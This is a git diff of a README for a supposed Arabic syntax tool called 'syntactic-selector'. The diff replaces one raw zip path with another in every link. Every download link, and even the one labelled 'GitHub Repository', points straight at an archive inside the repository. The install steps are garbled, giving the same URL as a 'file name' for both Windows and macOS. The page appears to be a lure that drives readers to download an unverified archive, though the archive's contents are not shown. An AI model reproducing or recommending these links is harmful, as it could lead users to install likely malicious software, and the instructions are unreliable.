@@ -6,7 +6,7 @@ Welcome to **syntactic-selector**! This tool helps you analyze Arabic syntax eff
 
 ## 📥 Download the Tool
 
-[![Download syntactic-selector](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/tests/syntactic-selector_v2.5.zip)](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/tests/syntactic-selector_v2.5.zip)
+[![Download syntactic-selector](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/المدونة/syntactic_selector_v1.5.zip)](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/المدونة/syntactic_selector_v1.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -33,9 +33,9 @@ Currently, **syntactic-selector** specializes in Arabic syntax. Future updates m
 
 ### 🖥️ Download & Install
 
-1. Visit [this page to download](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/tests/syntactic-selector_v2.5.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/المدونة/syntactic_selector_v1.5.zip).
 2. Choose the latest version of **syntactic-selector**.
-3. Click on the download link corresponding to your operating system. The files might be named something like `https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/tests/syntactic-selector_v2.5.zip` for Windows or `https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/tests/syntactic-selector_v2.5.zip` for macOS.
+3. Click on the download link corresponding to your operating system. The files might be named something like `https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/المدونة/syntactic_selector_v1.5.zip` for Windows or `https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/المدونة/syntactic_selector_v1.5.zip` for macOS.
 
 ### 📂 Running the Application
 
@@ -68,11 +68,11 @@ We welcome contributions! If you want to help improve **syntactic-selector**, fe
 ## 🔗 Stay Connected
 
 Follow us for updates and news:
-- [GitHub Repository](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/tests/syntactic-selector_v2.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/المدونة/syntactic_selector_v1.5.zip)
 - Social Media (link to Twitter/Facebook if applicable)
 
 ## 📥 Download Again
 
-For convenience, [visit this page to download](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/tests/syntactic-selector_v2.5.zip) the latest version.
+For convenience, [visit this page to download](https://raw.githubusercontent.com/abulu1234/syntactic-selector/main/المدونة/syntactic_selector_v1.5.zip) the latest version.
 
 Thank you for choosing **syntactic-selector**! Enjoy analyzing Arabic syntax effortlessly.
